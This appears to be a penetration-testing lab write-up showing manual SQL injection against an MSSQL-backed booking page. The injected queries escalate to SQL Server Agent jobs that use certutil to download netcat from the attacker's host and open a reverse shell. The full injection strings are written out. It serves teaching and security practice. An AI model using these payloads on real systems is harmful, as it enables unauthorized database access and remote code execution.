---
title: Manual SQLi On MSSQL [ Creating Jobs With Mssql ]
author: r0b0tG4nG
date: 2021-12-17 10:18:00 +0000
categories: [Blogging, Exploiting, Web Applications]
tags: [writeups, sqli, sql injection, burpsuite, shell, xp_cmdshell]
math: true
mermaid: true
---

![image](https://user-images.githubusercontent.com/67085453/146534410-1abcfb45-ad47-4adf-b54d-637ea41aedd2.png)

**> Information Gathering**<br>

SQL injection aka `SQLi` is a `web security vulnerability` that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.  More information on <a href="https://portswigger.net/web-security/sql-injection"> PortSwigger</a>
 
On port 80, we can see an amazing web application that's meant for booking trips. It's safe to assume that this is a travel agent website where one can book a destination to a desired location. The target website appears to have static webpages except the `book-trip.php` page. On this page we are presented with a login form which has 3 fields. `1. Destination`, `2. Adults` & `3. Children`.<br>
![image](https://user-images.githubusercontent.com/67085453/146534457-64377610-eb21-4c71-9928-693096c1a99f.png)<br>

In `SQLi`, there are few characters that are capable of triggering an error in a database. These characters are `*, ', " & a few others`. In this engagement, we will use a single `'` quote to test all fields. It's always best to test one field at a time, so let's put single quote `'` in the `destination field` and capture the request in burpsuite for further testing.<br>
![image](https://user-images.githubusercontent.com/67085453/146534508-19900b99-e551-4608-a2ee-beee590510dd.png)<br>

Pushing the request to `burpsuite forwarder`, and sending the request again, we were able to trigger a `sql error`. From the response in burpsuite, the error displayed is `Message: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''.` & `Message: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Incorrect syntax near ''.`<br>
![image](https://user-images.githubusercontent.com/67085453/146534664-ce769aa7-7712-4149-a2bc-cd167c2f1f4c.png)
<br>

The `destination field` is vulnerable to sql injection. To further exploit this vulnerability, we need to find the number of columns on the target. In `SQL`, the query `Order by` is used to sort the `result-set` in `ascending or descending order.`. To accomplish this, we will modify the data in our request `destination='+order+by+1+--&adults=1&children=1`. Note: we will keep increasing the values till we find the right columns on the target.<br>
![image](https://user-images.githubusercontent.com/67085453/146534570-aea70b24-8a91-45fe-ac13-d07d9b9cc688.png)<br>

The target database has `5 columns` which can be confirmed from the image above. The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, we need to find one or more columns in the original query results whose data type is, or is compatible with, string data. To test this, we will modify our data `destination='+UNION+SELECT+'a',2,3,4,5+--&adults=1&children=1`.  We will keep testing until the `alphabets` we submitted appears in the webapp response.<br>
![image](https://user-images.githubusercontent.com/67085453/146534844-8ee75f58-78a8-4472-9045-76a10d0a14a1.png)<br>

We found the relevant columns that are suitable for retrieving string data. We have all that we need now the next step is to start extracting information from the database. For starters, let's start with the version of SQL server running on the target. We can achieve this using `destination='+UNION+SELECT+1,'a',(SELECT+@@version),3,4+--&adults=1&children=1`<br>
![image](https://user-images.githubusercontent.com/67085453/146534862-13fff3f1-d047-4195-ac8d-cf617f3d2807.png)<br>

We can further enumerate the target database to retrieve information but it's unfortunate i won't dive deep into that. For more information on how to enumerate the database manually, you can check at <a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">perspectiverisk</a>. For now, let's focus on to enable `xp_cmdshell` on the target.<br>

After trying for some time to enable `xp_cmdshell` manually, i hit a dead-end. I tried all that i know and also followed the steps on both <a href="https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/">mssqltips</a> & <a href="https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e">medium.com</a> as well as few others, i failed. I decided to use the automatic method since i know the injection point, it’s easier to do it with `sqlmap`.<br>
![image](https://user-images.githubusercontent.com/67085453/146534917-09c92a28-6a5c-4cfe-a62b-f43254b458f4.png)<br>

Using `sqlmap` didn't do any good. I tried bypassing this feature with some few `sqlmap arguments` but i still failed. Looking at the screenshot above, sqlmap presented us with this error<br> 
```shell
[02:00:34] [WARNING] xp_cmdshell creation failed, probably because sp_OACreate is disabled
[02:00:34] [CRITICAL] unable to proceed without xp_cmdshell
```
<br>

**> Creating MSSQL Jobs Through SQLi**<br>

The question is "how do we do this?? is it even possible??"??  The answer is *YES* it is possible have you heard about `T-SQL`??
`T-SQL (Transact-SQL)` is a set of programming extensions from `Sybase and Microsoft` that add several features to the Structured Query Language (SQL), including transaction control, exception and error handling, row processing and declared variables.

`T-SQL identifiers`, meanwhile, are used in all databases, servers, and database objects in SQL Server. These include the following `tables, constraints, stored procedures, views, columns and data types`. T-SQL identifiers must each have a `unique name, are assigned when an object is created and are used to identify an object`.<br>

With this information, i looked deeper into assigning `T-SQL identifiers` on MSSQL which led to <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-add-jobserver-transact-sql?view=sql-server-ver15">microsoft T-SQL</a> documentation.<br>

To successfully create a `job` in MSSQL using `T-SQL`, we need two important arguments. These arguments are `[ @job_id = ] job_id` or `[ @job_name = ] 'job_name'` & `[ @server_name = ] 'server`. <br>

> Note: Either job_id or job_name must be specified, but both cannot be specified.

<br>

We have all the information we need but another issue pops up. What's the issue?? how do i create this without any error?? i googled for samples of `T-SQL Jobs` and i came across this website <a href="https://www.mssqltips.com/sqlservertip/3052/simple-way-to-create-a-sql-server-job-using-tsql/">mssqltips</a> which clearly defines a fully functional `T-SQL job`. From the sample on this website, i crafted a `T-SQL query` to test if i can ping my ipaddress  .<br>
```shell
';EXECUTE AS LOGIN = 'daedalus_admin';USE msdb;EXEC sp_delete_job @job_name = N'testping';EXEC dbo.sp_add_job @job_name = N'testping';EXEC sp_add_jobstep @job_name = N'testping', @step_name = N'ping', @subsystem = N'cmdexec', @command = N'c:\windows\system32\cmd.exe /c ping -n 10 10.10.15.25', @retry_attempts = 1, @retry_interval = 5, @proxy_id=1;EXEC dbo.sp_add_jobserver @job_name = N'testping';EXEC dbo.sp_start_job N'testping';--
```
<br>

To identify ping requests, we have to start `tcpdump` on my attacker machine to filter `icmp` on ipaddress of our network interface. We can achieve this by typing `sudo tcpdump -i tun0 icmp`  in this case, i am listening on `tun0` interface. Send the `testping T-SQL` request to the target from burpsuite and i received a ping on my machine.<br>
![image](https://user-images.githubusercontent.com/67085453/146534986-13349439-ead1-4a26-9b33-3d01c7d854bc.png)<br>


If we are able to execute a ping request, then we are two steps away from gaining remote code execution on the target. There are many ways to do this but i will stick to the basic 3:
> 1. Create an msfvenom payload, transfer to the target and execute it.<br>
> 2. Transfer netcat windows binary to the target and execute that for a rev shell<br>
> 3. Use a powershell one-liner to transfer and execute your nishang-tcp-shell script<br>

I will use the second method. First grab netcat windows binary from <a href="https://github.com/int0x33/nc.exe/">int0x33 GitHub repo</a>, then craft a new `T-SQL job` query to transfer the file from your attacking machine to the target machine.<br>
```shell
';EXECUTE AS LOGIN = 'daedalus_admin';USE msdb;EXEC sp_delete_job @job_name = N'testping';EXEC dbo.sp_add_job @job_name = N'testping';EXEC sp_add_jobstep @job_name = N'testping', @step_name = N'ping', @subsystem = N'cmdexec', @command = N'c:\\windows\\system32\\cmd.exe /c certutil -urlcache -f http://10.10.15.25/nc64.exe C:\\Windows\\temp\\nc64.exe', @retry_attempts = 1, @retry_interval = 5, @proxy_id=1;EXEC dbo.sp_add_jobserver @job_name = N'testping';EXEC dbo.sp_start_job N'testping';--
```
<br>

Start python server on the attacking machine using `python -m SimpleHTTPServer port number` or the py3 method `python3 -m http.server port number` then put this `T-SQL` query in burpsuite and forward the request once again. It worked i got a hit from the target machine. `Nc64.exe` is transferred to `C:\\Windows\\temp\\` directory.<br>
![image](https://user-images.githubusercontent.com/67085453/146535020-9cff2fb4-4005-45e1-84f1-6d1c2d7067e1.png)<br>

All we need to do now is to parse our `ipaddress` and `port number` to `nc64.exe` in order to gain a reverse connection to the target machine. As usual we have to modify our `T-SQL` query to perform this action. Once done, modify burpsuite data and send request again. <br>
```shell
';EXECUTE AS LOGIN = 'daedalus_admin';USE msdb;EXEC sp_delete_job @job_name = N'testping';EXEC dbo.sp_add_job @job_name = N'testping';EXEC sp_add_jobstep @job_name = N'testping', @step_name = N'ping', @subsystem = N'cmdexec', @command = N'C:\\Windows\\temp\\nc64.exe 10.10.15.25 445 -e cmd.exe', @retry_attempts = 1, @retry_interval = 5, @proxy_id=1;EXEC dbo.sp_add_jobserver @job_name = N'testping';EXEC dbo.sp_start_job N'testping';--
```
<br>


Whoop Whoop we got a reverse connection to the target machine. I hope you enjoyed the ride and also discovered something new. Kindly subscribe to my <a href="https://www.youtube.com/channel/UCSY-pfwuYspZFlRsO7vBfIQ"> YouTube channel</a> for more contents<br>
![image](https://user-images.githubusercontent.com/67085453/146535039-fc5cc779-43b1-4f0b-83c6-ad7129b54219.png).
